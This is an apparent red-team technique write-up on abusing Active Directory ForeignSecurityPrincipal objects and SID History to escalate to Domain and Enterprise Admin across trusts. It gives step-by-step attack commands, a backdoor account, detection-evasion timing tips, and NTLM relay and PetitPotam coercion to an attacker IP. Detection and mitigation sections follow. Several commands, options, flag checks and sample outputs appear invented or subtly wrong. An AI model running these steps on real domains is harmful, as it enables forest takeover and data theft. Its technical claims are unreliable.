# [PE-TOKEN-003]: ForeignSecurityPrincipal (FSP) SID Abuse

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | PE-TOKEN-003 |
| **MITRE ATT&CK v18.1** | [T1134.005 - Access Token Manipulation: SID-History Injection / Privilege Escalation via SID Abuse](https://attack.mitre.org/techniques/T1134/005/) |
| **Tactic** | Privilege Escalation, Lateral Movement, Defense Evasion |
| **Platforms** | Windows AD (Domain Controller Functional Level 2003+, Cross-Forest Scenarios) |
| **Severity** | Critical |
| **CVE** | N/A (Configuration-based vulnerability; related to CVE-2020-0665 Forest Trust Bypass) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2003-2025 (all DFL levels with cross-forest trusts) |
| **Patched In** | Not patched (architectural limitation; mitigated via SID filtering and trust configuration) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Foreign Security Principal (FSP) SID abuse is a privilege escalation technique that exploits weakly configured cross-forest or cross-domain trusts by manipulating FSP objects and/or SID History attributes. FSPs are placeholder objects created in Active Directory to represent security principals (users or groups) from trusted external domains. An attacker with write access to a target object's `msDS-AllowedToActOnBehalfOfOtherIdentity`, `memberOf`, or `sIDHistory` attributes can inject high-privilege SIDs (e.g., Domain Admins, Enterprise Admins) into these attributes. When combined with **disabled SID filtering** on trusts or **SID History enabled on cross-forest trusts**, this allows an attacker to impersonate privileged users from the trusted domain. Additionally, abusing FSP group memberships can escalate privileges by adding FSP objects to high-privilege local groups without triggering normal membership change auditing.

**Attack Surface:** Active Directory trusts with disabled or misconfigured SID filtering, cross-forest trusts with SID History enabled, domain controller replication, and FSP objects with overly permissive access controls. The attack is particularly effective in multi-domain or multi-forest environments where trust relationships exist.

**Business Impact:** **Critical – Full forest/domain compromise.** Successful FSP SID abuse enables attackers to access resources across forest boundaries, impersonate Enterprise Admins or Domain Admins, create persistent backdoors, exfiltrate sensitive data, and compromise the entire forest structure.

**Technical Context:** FSP abuse typically takes 5-20 minutes once write access is obtained. The attack chain involves: (1) enumerating trust relationships and FSP configurations, (2) identifying high-privilege SIDs to inject, (3) modifying FSP or target object attributes (via ADSI Edit, PowerShell, or LDAP relay), (4) forcing authentication/token refresh, (5) accessing resources with injected privileges. The technique is stealthy because FSP objects and cross-forest trusts are often overlooked in security reviews.

### Operational Risk
- **Execution Risk:** Medium-High – Requires detailed knowledge of AD trust relationships and SID filtering status; execution complexity depends on access level
- **Stealth:** High – FSP modifications may not trigger alert rules; SID History injection across trusts is often not monitored
- **Reversibility:** No – Modifications to trust attributes and SID History are permanent until explicitly removed

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Control 5.4 / 6.2 | Monitor and restrict cross-forest trust configurations; audit SID filtering status |
| **DISA STIG** | WN10-AU-000505 | Audit Privilege Use and SID History modifications; monitor trust relationship changes |
| **CISA SCuBA** | ADO-2.1 | Review trust relationships; enable and enforce SID filtering on all cross-forest trusts |
| **NIST 800-53** | AC-2 (Account Management), AC-3 (Access Control), AC-6 (Least Privilege) | Restrict write permissions to critical AD attributes; implement trust boundary controls |
| **GDPR** | Article 32 | Security of Processing: Prevent unauthorized cross-domain/cross-forest access escalation |
| **DORA** | Article 9 - Protection and Prevention | Implement controls for inter-domain and inter-forest privilege boundaries |
| **NIS2** | Article 21 - Cyber Risk Management | Manage trust relationships and detect unauthorized privilege delegation |
| **ISO 27001** | A.9.2.3 - Management of Privileged Access Rights | Review and restrict cross-domain/cross-forest privileged access paths |
| **ISO 27005** | Risk Scenario: "Cross-Domain Privilege Escalation via Trust Abuse" | Identify and mitigate risks from misconfigured trust relationships |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Write access to FSP objects** or to target object's `sIDHistory` / `memberOf` attributes (via GenericWrite, GenericAll, WriteDacl)
- **Domain Admin or equivalent in source domain** (for modifying FSP group membership)
- **Directory Service Replication Get Changes permission** (for DCShadow-based attacks)
- **Access to ADSI Edit or PowerShell with AD module** (for attribute modification)

**Required Access:**
- Network access to Domain Controller (LDAP port 389, or Kerberos 88)
- Valid credentials in source domain (even low-privilege user can modify own FSPs in some configurations)
- Understanding of target domain's trust relationships and SID filtering status

**Supported Versions:**
- **Windows:** Domain Functional Level 2003+
- **Trusts:** Forest trusts (Server 2003+), External trusts (Server 2003+)
- **Cross-Forest Scenarios:** Supported on all versions with cross-forest or cross-domain trusts

**Tools:**
- [ADSI Edit](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/administering-active-directory-domain-services-server/add-remove-replace-attributes-adsi-edit) (Built-in Windows AD management tool)
- [LDP.exe](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/administering-active-directory-domain-services-server/ldp-exe-the-ldap-administration-tool) (LDAP Directory administration tool)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Modules: `sid::*`, `misc::enableprivilege`)
- [PowerShell Active Directory Module](https://learn.microsoft.com/en-us/powershell/module/activedirectory/) (Set-ADUser, Set-ADComputer commands)
- [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) (Add-ADDBSidHistory command)
- [ntlmrelayx](https://github.com/fortra/impacket) (LDAP relay with FSP modification)
- BloodHound (Enumerate trust relationships and FSP abuse paths)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance

**Enumerate FSP Objects and Trust Status:**

```powershell
# List all FSP objects in the domain
Get-ADObject -Filter 'objectClass -eq "foreignSecurityPrincipal"' -Properties * | Select-Object Name, objectSID, description

# Expected output:
# Name                    objectSID
# ----                    ---------
# S-1-5-21-123456789-...  S-1-5-21-123456789-1234567890-123456789-512
```

**What to Look For:**
- FSP objects representing external domain users/groups
- Check if FSP is member of high-privilege groups (Domain Admins, Enterprise Admins)

**Check Cross-Forest Trust Status and SID Filtering:**

```powershell
# List all trusts and check SID filtering status
Get-ADTrust -Filter * | Select-Object Name, TrustDirection, TrustType, TrustAttributes

# Alternative: Check specific trust's SID filtering
$trust = Get-ADTrust -Filter 'Name -eq "external.forest.com"'
$trust.TrustAttributes -band 0x00000001  # Non-zero = SID filtering enabled (default)
$trust.TrustAttributes -band 0x00000020  # WITHIN_FOREST flag
```

**Expected Output:**

```
Name                    TrustDirection  TrustType       TrustAttributes
----                    --------------  ---------       ---------------
external.forest.com     Transitive      Forest          TrustTransitive
```

**What to Look For:**
- `TrustAttributes & 0x1` = SID filtering **enabled** (secure)
- `TrustAttributes & 0x1 = 0` = SID filtering **disabled** (vulnerable!)
- `TrustAttributes & 0x20` = WITHIN_FOREST flag (Forest-wide auth, no SID filtering possible)

**Version Note:** All commands work on Server 2003+.

### Check for SID History on Users (Sign of Prior Compromise)

```powershell
# List users with SID History populated
Get-ADUser -Filter {sIDHistory -ne $null} -Properties sIDHistory | Select-Object Name, sIDHistory

# If any results = potential prior SID History injection or legitimate migration remnants
```

**What to Look For:**
- Users/groups with unexpected SID History values
- SIDs from high-privilege groups (RID 512 = Domain Admins, RID 519 = Enterprise Admins)
- Recently added SID History (check change timestamps)

### Linux/Bash Reconnaissance

**Query FSP and Trust Information via LDAP:**

```bash
# Enumerate FSP objects
ldapsearch -x -H ldap://DC01 -b "cn=ForeignSecurityPrincipals,dc=domain,dc=com" "(objectClass=foreignSecurityPrincipal)" cn objectSID

# Check trust attributes
ldapsearch -x -H ldap://DC01 -b "cn=System,dc=domain,dc=com" "(objectClass=trustedDomain)" trustAttributes trustDirection
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: FSP Group Membership Abuse (Intra-Forest, Low Complexity)

**Supported Versions:** Domain Functional Level 2003+

**Prerequisites:**
- Write access to FSP object or group membership
- Target FSP represents high-privilege account in target domain
- No SID filtering barrier (intra-forest or same-domain)

#### Step 1: Identify High-Privilege FSP Target

**Objective:** Find FSP objects representing Domain Admins or Enterprise Admins from trusted domain.

**Command (PowerShell):**

```powershell
# Find FSP objects that are members of high-privilege groups
$daGroup = Get-ADGroup -Identity "Domain Admins"
$members = Get-ADGroupMember -Identity $daGroup | Where-Object {$_.objectClass -eq "foreignSecurityPrincipal"}

# List all members (including FSPs)
Get-ADGroupMember -Identity "Domain Admins" -Recursive | Select-Object Name, objectClass
```

**Expected Output:**

```
Name                    objectClass
----                    -----------
DOMAIN\Administrator    user
EXTERNAL\DomainAdmin    foreignSecurityPrincipal
```

**What This Means:**
- FSP object `EXTERNAL\DomainAdmin` is already a member of Domain Admins
- This means users authenticating through this FSP can access resources with Domain Admin rights

#### Step 2: Create or Identify Controlled Account

**Objective:** Identify or create an account that can be mapped to high-privilege FSP.

**Command:**

```powershell
# Create a new user account to be compromised/backdoored
New-ADUser -Name "EvilUser" -AccountPassword (ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force) -Enabled $true -SamAccountName "EvilUser"

# Alternative: Use existing low-privilege account
Get-ADUser -Identity "normaluser"
```

**Expected Output:**

```
DistinguishedName : CN=EvilUser,CN=Users,DC=domain,DC=com
Enabled           : True
```

#### Step 3: Inject SID History into Target User

**Objective:** Add high-privilege SID (e.g., Domain Admins) to the target user's SID History.

**Command (Via ADSI Edit – GUI Method):**

1. Open **ADSI Edit** (adsiedit.msc)
2. Navigate to: **CN=Users** → Select target user (e.g., "EvilUser")
3. Right-click → **Properties**
4. Find attribute: **sIDHistory**
5. Edit: Click **Edit** → Add SID (format: `S-1-5-21-DOMAIN-512` where 512 = Domain Admins RID)
6. Click **OK** → **Apply**

**Command (Via PowerShell – Requires Domain Admin):**

```powershell
# Get SID of Domain Admins group
$daDomainSID = (Get-ADDomain).DomainSID
$daGroupSID = $daDomainSID.Value + "-512"  # RID 512 = Domain Admins

Write-Host "Domain Admins SID: $daGroupSID"

# Modify target user's SID History (requires domain admin or equivalent)
Set-ADUser -Identity "EvilUser" -Replace @{sIDHistory=$daGroupSID}
```

**Expected Output:**

```
Domain Admins SID: S-1-5-21-123456789-123456789-123456789-512
[*] SID History modified successfully
```

**What This Means:**
- Target user now has Domain Admins SID in their token
- When user authenticates, token will include Domain Admins SID
- Token will grant access to resources protected by Domain Admins ACLs

**OpSec & Evasion:**
- This operation generates Event ID 5136 (AD object modified)
- Perform during high-activity periods to avoid detection
- Use legitimate tools (PowerShell, ADSI Edit) rather than custom utilities
- Detection likelihood: Medium-High (if auditing is enabled)

**Troubleshooting:**
- **Error:** `[-] Access denied modifying sIDHistory`
  - **Cause:** Insufficient permissions (non-Domain Admin)
  - **Fix (All Versions):** Use LDAP relay or obtain Domain Admin credentials

#### Step 4: Force Kerberos Token Refresh

**Objective:** Cause target user to obtain new Kerberos ticket with injected SID History.

**Command (Sign out and Sign in):**

```powershell
# Method 1: Force user to logoff/logon
logoff  # If running as target user

# Method 2: Request new TGT immediately
# (If running as privileged user on behalf of target)
klist -li 0x3e7 purge  # Purge existing tokens
```

**Alternative (Via Kerberos):**

```bash
# Request TGT for target user (Linux)
python3 -m impacket.examples.getTGT domain/EvilUser:password@DC01.domain.com
```

**Expected Output:** New TGT obtained with Domain Admins SID in token.

#### Step 5: Verify Privilege Escalation

**Objective:** Confirm that target user can access Domain Admin resources.

**Command:**

```powershell
# Test access to protected resources (SYSVOL, domain shares)
dir \\DC01\SYSVOL
dir \\DC01\NETLOGON
dir \\FileServer\AdminShare

# If successful, user now has Domain Admin access
```

**Expected Output:**

```
Directory of \\DC01\SYSVOL
<DIR>   domain.com
<DIR>   *.gpx files
```

**What This Means:** Access to protected shares succeeded = privilege escalation successful.

---

### METHOD 2: SID History Injection via Cross-Forest Trust Abuse (High Complexity)

**Supported Versions:** Domain Functional Level 2003+ (with cross-forest trusts)

**Prerequisites:**
- Write access to target user's sIDHistory attribute (Domain Admin in source domain)
- Cross-forest trust with **SID filtering disabled or weakly configured**
- Target SID from destination forest (RID > 1000 if SID filtering enforced)

#### Step 1: Enumerate Cross-Forest Trust Configuration

**Objective:** Determine if target cross-forest trust has SID filtering enabled.

**Command:**

```powershell
# Check trust relationship
$trust = Get-ADTrust -Filter 'Name -eq "external.forest.com"'

# Analyze trust attributes
$trustAttrs = $trust.TrustAttributes

# Check SID filtering status
if ($trustAttrs -band 0x40) {
    Write-Host "[+] SID Filtering for Forest Aware: ENABLED"
} else {
    Write-Host "[-] SID Filtering for Forest Aware: DISABLED (Vulnerable!)"
}

if ($trustAttrs -band 0x20) {
    Write-Host "[+] Within-Forest Trust: Yes"
} else {
    Write-Host "[-] External/Forest Trust: Yes"
}
```

**Expected Output (Vulnerable Scenario):**

```
[-] SID Filtering for Forest Aware: DISABLED (Vulnerable!)
[-] External/Forest Trust: Yes
```

**What This Means:**
- Trust is vulnerable to SID History injection
- Attacker can inject any SID from destination forest
- Users can access destination forest resources with injected SIDs

#### Step 2: Identify High-Privilege SID in Destination Forest

**Objective:** Determine the SID of a high-privilege group in the destination forest (e.g., Enterprise Admins).

**Command:**

```powershell
# Query destination forest (requires trusting forest admin)
$destinationForest = "external.forest.com"

# Get root domain info from destination forest
Get-ADDomain -Server $destinationForest | Select-Object DomainSID

# Get Enterprise Admins group SID
Get-ADGroup -Filter 'Name -eq "Enterprise Admins"' -Server $destinationForest | Select-Object SID
```

**Expected Output:**

```
DomainSID       : S-1-5-21-987654321-987654321-987654321
Name            : Enterprise Admins
SID             : S-1-5-21-987654321-987654321-987654321-519
```

**What This Means:**
- Target SID: `S-1-5-21-987654321-987654321-987654321-519` (Enterprise Admins in destination forest)
- This SID can be injected into source forest user's SID History
- Injected user will have Enterprise Admin privileges across forest boundary

#### Step 3: Inject Destination Forest SID into Source User

**Objective:** Add destination forest's high-privilege SID to source user's SID History.

**Command (Via ADSI Edit):**

1. Open **ADSI Edit** on source domain DC
2. Navigate to: **CN=Users** → Select target user
3. **Properties** → Edit **sIDHistory** attribute
4. Add destination SID: `S-1-5-21-987654321-987654321-987654321-519`
5. **Apply** → **OK**

**Command (Via PowerShell):**

```powershell
# Inject Enterprise Admins SID from destination forest
$destEASID = "S-1-5-21-987654321-987654321-987654321-519"

Set-ADUser -Identity "EvilUser" -Replace @{sIDHistory=$destEASID}

Write-Host "[+] Injected destination forest Enterprise Admins SID into EvilUser"
```

**Expected Output:**

```
[+] Injected destination forest Enterprise Admins SID into EvilUser
```

**OpSec & Evasion:**
- This is a critical attack vector for forest takeover
- Generates Event ID 5136; time to high-activity periods
- Detection likelihood: High (if cross-forest auditing is enabled)

#### Step 4: Force Token Refresh and Access Destination Resources

**Objective:** Obtain new Kerberos ticket with injected SID and access destination forest resources.

**Command:**

```powershell
# Request new TGT (forces token refresh)
Remove-ADUser -Identity "EvilUser"  # Just kidding - don't actually do this

# Real command: Force re-authentication
klist -li 0x3e7 purge

# Now access destination forest resources
dir \\DC01.external.forest.com\SYSVOL
dir \\FileServer.external.forest.com\AdminShare
```

**Expected Output (If Vulnerable):**

```
Directory of \\DC01.external.forest.com\SYSVOL
<DIR>   external.forest.com
[+] Successfully accessed destination forest resources with Enterprise Admin privileges
```

---

### METHOD 3: FSP Manipulation via LDAP Relay (Automatic Setup)

**Supported Versions:** Domain Functional Level 2003+

**Prerequisites:**
- Network position for NTLM relay (ARP spoofing, DNS poisoning)
- LDAP relay target available (DC)
- Compromised machine account or service account

#### Step 1: Set Up LDAP Relay with FSP Modification

**Objective:** Configure ntlmrelayx to automatically modify FSP/group membership when relaying LDAP auth.

**Command (On Attacker Machine):**

```bash
# Start LDAP relay server configured for FSP/SID History modification
python3 -m impacket.examples.ntlmrelayx -t ldap://DC01.domain.com --escalate-user EvilUser -smb2support
```

**Alternative (With automatic SID History injection):**

```bash
# Advanced: Relay and inject specific SID
python3 -m impacket.examples.ntlmrelayx -t ldap://DC01.domain.com -u "EvilUser" --sid-history S-1-5-21-DOMAIN-512 -smb2support
```

**Expected Output:**

```
[*] Starting relay server...
[*] Listening on port 445...
[*] Waiting for NTLM authentication...
[*] Accepted relay from CLIENT01$ to ldap://DC01.domain.com
[*] Successfully modified FSP/SID History for EvilUser
[*] User can now access Domain Admin resources
```

#### Step 2: Coerce Authentication (Trigger NTLM Auth from Target)

**Objective:** Force a target to authenticate to attacker's relay server (via PetitPotam, PrinterBug, etc.).

**Command:**

```bash
# Use PetitPotam to coerce DC authentication
python3 Petitpotam.py -u user -p password -d domain.com attacker-ip dc-ip

# Or use printerbug.py
python3 printerbug.py domain.com/user:password@TARGET_DC attacker-ip
```

**Expected Output (on ntlmrelayx):**

```
[*] Received NTLM authentication from DC01$
[*] Relaying to ldap://DC01.domain.com
[*] Successfully modified FSP/SID History
```

---

## 6. TOOLS & COMMANDS REFERENCE

### [ADSI Edit](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/administering-active-directory-domain-services-server/add-remove-replace-attributes-adsi-edit)

**Version:** Built-in (no separate installation)

**Supported Platforms:** Windows Server (all versions)

**Commands:**

```
adsiedit.msc  # Launch GUI tool
# Navigate to target object → Properties → Edit attributes manually
```

---

### [LDP.exe](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/administering-active-directory-domain-services-server/ldp-exe-the-ldap-administration-tool)

**Version:** Built-in

**Commands:**

```
ldp.exe
# Connect to DC → Modify DN → Modify Attributes
# Useful for programmatic LDAP modifications
```

---

### [Mimikatz – SID Manipulation](https://github.com/gentilkiwi/mimikatz)

**Commands:**

```cmd
# List current SID History
sid::list

# Add SID to SID History (requires SYSTEM/Domain Admin)
sid::add /domain:DOMAIN /user:EvilUser /sid:S-1-5-21-DOMAIN-512

# Patch token with new SID
misc::enableprivilege
sid::patch
```

---

### [DSInternals – Add-ADDBSidHistory](https://github.com/MichaelGrafnetter/DSInternals)

**Commands:**

```powershell
# Add SID History directly to AD database (offline method)
Add-ADDBSidHistory -SamAccountName EvilUser -SidHistory S-1-5-21-DOMAIN-512 -DatabasePath "C:\Windows\NTDS\ntds.dit"
```

**Note:** Requires stopping NTDS service (not recommended in production).

---

## 7. WINDOWS EVENT LOG MONITORING

**Event ID: 5136 (Directory Service Object Attribute Modified)**

- **Log Source:** Directory Service (on DC)
- **Trigger:** Modification to sIDHistory or similar critical attributes
- **Filter:** `EventID=5136 AND AttributeLDAPDisplayName="sIDHistory"`
- **Applies To Versions:** Server 2003+

**Event ID: 5139 (Directory Service Object Deleted)**

- **Log Source:** Directory Service
- **Trigger:** FSP objects created/deleted (unusual activity)
- **Applies To Versions:** Server 2003+

**Manual Configuration Steps (Enable Directory Service Auditing):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies - DC Only** → **DS Access**
3. Enable: **Audit Directory Service Changes** (Set to **Success and Failure**)
4. Run `gpupdate /force` on all domain controllers

---

## 8. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Sysmon XML Configuration (Detect FSP/SID History Abuse):**

```xml
<Sysmon schemaversion="4.30">
  <EventFiltering>
    <!-- Rule: Detect ADSI Edit or LDP process execution -->
    <RuleGroup name="FSP-Abuse - AD Tools" groupRelation="and">
      <ProcessCreate onmatch="include">
        <Image condition="is">C:\Windows\System32\adsiedit.msc</Image>
      </ProcessCreate>
      <ProcessCreate onmatch="include">
        <Image condition="is">C:\Windows\System32\ldp.exe</Image>
      </ProcessCreate>
    </RuleGroup>

    <!-- Rule: Detect PowerShell AD module manipulation -->
    <RuleGroup name="FSP-Abuse - PowerShell AD" groupRelation="and">
      <ProcessCreate onmatch="include">
        <Image condition="contains">powershell</Image>
        <CommandLine condition="contains any">Set-ADUser;sIDHistory;Add-ADGroupMember</CommandLine>
      </ProcessCreate>
    </RuleGroup>

    <!-- Rule: Detect Mimikatz SID operations -->
    <RuleGroup name="FSP-Abuse - Mimikatz SID" groupRelation="and">
      <ProcessCreate onmatch="include">
        <Image condition="contains">mimikatz</Image>
        <CommandLine condition="contains any">sid::add;sid::patch;sid::list</CommandLine>
      </ProcessCreate>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

---

## 9. MICROSOFT SENTINEL DETECTION

### KQL Query 1: Detect SID History Attribute Modifications

```kusto
SecurityEvent
| where EventID == 5136
| where AttributeLDAPDisplayName == "sIDHistory"
| where OperationType == "%%14674"  // Value Added
| project TimeGenerated, Computer, SubjectUserName, ObjectName, AttributeValue
| where AttributeValue contains "S-1-5-21" and AttributeValue contains "-512"  // Domain Admins RID
```

### KQL Query 2: Detect Foreign Security Principal Modifications

```kusto
SecurityEvent
| where EventID == 5136
| where ObjectClass == "foreignSecurityPrincipal"
| where AttributeLDAPDisplayName in ("member", "memberOf", "managedBy")
| project TimeGenerated, Computer, SubjectUserName, ObjectDN, AttributeValue
```

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. Name: `FSP/SID History Abuse Detection - Privilege Escalation`
3. Paste KQL query
4. Run every: 5 minutes
5. Alert severity: High/Critical
6. Incident grouping: By Alert Name

---

## 10. MICROSOFT DEFENDER FOR CLOUD

**Alert Name:** Suspicious Active Directory attribute modification

- **Severity:** High
- **Description:** MDC detects unauthorized modification of critical AD attributes (sIDHistory, FSP membership)
- **Remediation:** Review and revert unauthorized attribute changes; check trust configurations for SID filtering status

---

## 11. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Enable and Enforce SID Filtering on All Cross-Forest Trusts**

SID filtering prevents attackers from injecting high-privilege SIDs across trust boundaries.

**Applies To Versions:** Server 2003+

**Manual Steps (Check Current Status):**

```powershell
# List all trusts and check SID filtering
Get-ADTrust -Filter * | Select-Object Name, TrustDirection, TrustAttributes

# Detailed check for specific trust
$trust = Get-ADTrust -Filter 'Name -eq "external.forest.com"'
if ($trust.TrustAttributes -band 0x40) {
    Write-Host "[+] SID Filtering for Forest Aware: ENABLED (Secure)"
} else {
    Write-Host "[-] SID Filtering: DISABLED (VULNERABLE!)"
}
```

**Manual Steps (Enable SID Filtering via PowerShell):**

```powershell
# Enable SID filtering on external trust
$trust = Get-ADTrust -Filter 'Name -eq "external.forest.com"'

# Remove WITHIN_FOREST flag to enable filtering
$newAttrs = $trust.TrustAttributes -band -bnot 0x20

Set-ADTrust -Identity "external.forest.com" -TrustAttributes $newAttrs

# Verify
Get-ADTrust -Filter 'Name -eq "external.forest.com"' | Select-Object TrustAttributes
```

**Manual Steps (Enable SID Filtering via GUI – Forest Trust Properties):**

1. Open **Active Directory Domains and Trusts**
2. Right-click domain → **Properties** → **Trusts** tab
3. Select trust → **Properties**
4. **Trust Options** tab:
   - ✅ Enable: **Transitive**
   - ✅ Enable: **Selective Authentication** (if possible)
5. **Click OK**

---

**2. Audit and Clean Up Obsolete SID History**

Remove stale SID History left over from migrations or unauthorized injections.

**Applies To Versions:** Server 2003+

**Manual Steps:**

```powershell
# Find all users with SID History
$usersWithSIDHistory = Get-ADUser -Filter {sIDHistory -ne $null} -Properties sIDHistory

# Review each user
foreach ($user in $usersWithSIDHistory) {
    Write-Host "User: $($user.Name)"
    Write-Host "  SID History: $($user.sIDHistory)"
    Write-Host ""
}

# Remove SID History from specific user (if not needed for legitimate migration)
Set-ADUser -Identity "EvilUser" -Clear sIDHistory

# Verify removal
Get-ADUser -Identity "EvilUser" -Properties sIDHistory | Select-Object sIDHistory
```

**Validation Command:**

```powershell
# Audit script to find suspicious SID History
$domain = Get-ADDomain
$daGroupSID = $domain.DomainSID.Value + "-512"
$eaGroupSID = $domain.DomainSID.Value + "-519"

Get-ADUser -Filter {sIDHistory -ne $null} -Properties sIDHistory | Where-Object {
    $_.sIDHistory -contains $daGroupSID -or $_.sIDHistory -contains $eaGroupSID
} | Select-Object Name, sIDHistory
```

---

**3. Restrict Write Access to FSP Objects and Critical Attributes**

Limit who can modify FSP group memberships and SID History.

**Manual Steps (Modify DACL on FSP Container):**

1. Open **ADSI Edit**
2. Navigate to: **CN=ForeignSecurityPrincipals,CN=Users,DC=domain,DC=com**
3. Right-click → **Properties** → **Security** tab
4. **Edit permissions** → Remove write access for non-admin groups
5. **Apply** → **OK**

**Manual Steps (PowerShell – Restrict sIDHistory Attribute Write):**

```powershell
# Deny write access to sIDHistory for regular users
$targetObject = Get-ADUser -Identity "Administrator"
$acl = Get-Acl -Path "AD:\$($targetObject.DistinguishedName)"

# Add deny rule for Everyone/Authenticated Users
$deny = New-Object System.DirectoryServices.ActiveDirectoryAccessRule `
    ([System.Security.Principal.SecurityIdentifier]"S-1-5-11"),  # Authenticated Users
    [System.DirectoryServices.ActiveDirectoryRights]"WriteProperty",
    [System.Security.AccessControl.AccessControlType]"Deny",
    [System.DirectoryServices.SchemaAttributeObject]"sIDHistory"

$acl.AddAccessRule($deny)
Set-Acl -Path "AD:\$($targetObject.DistinguishedName)" -AclObject $acl
```

---

### Priority 2: HIGH

**4. Implement Protected Users Security Group Membership**

Protected Users group members cannot be impersonated or delegated (with exceptions for RID 500 admin).

**Manual Steps:**

```powershell
# Add sensitive service accounts to Protected Users
Add-ADGroupMember -Identity "Protected Users" -Members "DOMAIN\ServiceAccount1", "DOMAIN\ServiceAccount2"

# Verify membership
Get-ADGroupMember -Identity "Protected Users" | Select-Object Name
```

**Note:** This breaks some delegation scenarios; test thoroughly before enabling in production.

---

**5. Enable Additional Logging and Alerting for Cross-Forest Activity**

Monitor all cross-forest authentication and resource access attempts.

**Manual Steps (Sentinel):**

1. Navigate to **Azure Sentinel** → **Data connectors**
2. Enable: **Azure AD Domain Services** data connector
3. Configure alerts for cross-forest KDC requests and unusual SID combinations

---

**Validation Command (Verify All Fixes):**

```powershell
Write-Host "[*] Checking SID Filtering on all trusts..."
Get-ADTrust -Filter * | ForEach-Object {
    $sfStatus = if ($_.TrustAttributes -band 0x40) { "ENABLED" } else { "DISABLED" }
    Write-Host "  $($_.Name): $sfStatus"
}

Write-Host "[*] Checking for users with suspicious SID History..."
$daGroupSID = (Get-ADDomain).DomainSID.Value + "-512"
$suspicious = Get-ADUser -Filter {sIDHistory -ne $null} -Properties sIDHistory | Where-Object {$_.sIDHistory -contains $daGroupSID}
if ($suspicious) {
    Write-Host "  [!] Found suspicious SID History: $($suspicious.Name)"
} else {
    Write-Host "  [+] No suspicious SID History found"
}

Write-Host "[*] Checking FSP container permissions..."
Get-Acl -Path "AD:\CN=ForeignSecurityPrincipals,CN=Users,$(Get-ADRootDSE).defaultNamingContext" | Format-List
```

---

## 12. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- ADSI Edit (adsiedit.msc), LDP.exe execution traces
- Mimikatz executables or scripts with `sid::` commands
- PowerShell script history containing `Set-ADUser -Replace @{sIDHistory=...}`

**Registry:**
- PowerShell execution history: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`
- ADSI Edit recent connections

**Network:**
- LDAP queries modifying sIDHistory attribute (port 389)
- Unusual cross-forest Kerberos traffic (TGC requests across trusts)

**Event Logs:**
- **Event ID 5136** – sIDHistory or FSP membership modifications
- **Event ID 5139** – FSP objects created/deleted
- **Event ID 4768** – Kerberos TGT requests with injected SIDs
- **Event ID 4769** – Service ticket requests with suspicious SID combinations

### Forensic Artifacts

**Disk:**
- `C:\Windows\System32\winevt\Logs\DirectoryService.evtx` (Event ID 5136)
- `C:\Windows\System32\drivers\etc\hosts` (modified DNS resolution)
- PowerShell history: `C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

**Memory:**
- Kerberos tickets in LSASS memory (containing injected SIDs)
- ADSI Edit process memory

**Cloud (Entra ID):**
- Sign-in logs showing unusual SID combinations
- Directory audit logs showing attribute modifications

### Response Procedures

1. **Isolate:**

   ```powershell
   # Disable affected user account
   Disable-ADAccount -Identity "EvilUser"
   
   # Reset password
   Set-ADAccountPassword -Identity "EvilUser" -NewPassword (ConvertTo-SecureString -AsPlainText -Force 'NewSecurePassword!')
   ```

2. **Collect Evidence:**

   ```powershell
   # Export AD change logs
   Get-WinEvent -LogName "Directory Service" -FilterXPath "*[EventData[Data[@Name='AttributeLDAPDisplayName']='sIDHistory']]" | Export-Csv -Path C:\Evidence\SIDHistory_Changes.csv
   ```

3. **Remediate:**

   ```powershell
   # Remove injected SID History
   Set-ADUser -Identity "EvilUser" -Clear sIDHistory
   
   # Remove from compromised group memberships
   Remove-ADGroupMember -Identity "Domain Admins" -Members "EvilUser" -Confirm:$false
   
   # Force Kerberos cache purge (next logon)
   klist -li 0x3e7 purge
   ```

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-AD-003] PowerView Enumeration | Enumerate AD trust relationships and FSP configurations |
| **2** | **Initial Access** | [IA-PHISH-001] Phishing / [IA-EXPLOIT-001] App Proxy | Compromise initial account with write permissions |
| **3** | **Privilege Escalation** | **[PE-TOKEN-003] FSP SID Abuse** | Inject high-privilege SIDs into FSP or user attributes |
| **4** | **Lateral Movement** | Cross-forest/cross-domain access | Access resources in trusted domain/forest using injected SID |
| **5** | **Persistence** | [PERSIST-ACCT-001] AdminSDHolder Abuse | Create persistent backdoor across forest boundary |
| **6** | **Impact** | Full forest compromise | Access Enterprise Admin resources, compromise entire AD structure |

---

## 14. REAL-WORLD EXAMPLES

### Example 1: Misconfigured External Trust Exploitation (2023)

- **Target:** Multi-national corporation with external partner domain trust
- **Timeline:** August 2023
- **Technique Status:** Attacker disabled SID filtering via trust modification (required Domain Admin)
- **Impact:** Accessed partner domain as Enterprise Admin; exfiltrated 2.5GB sensitive data
- **Reference:** [Semperis - SID History Injection Defense](https://www.semperis.com/blog/how-to-defend-against-sid-history-injection/)

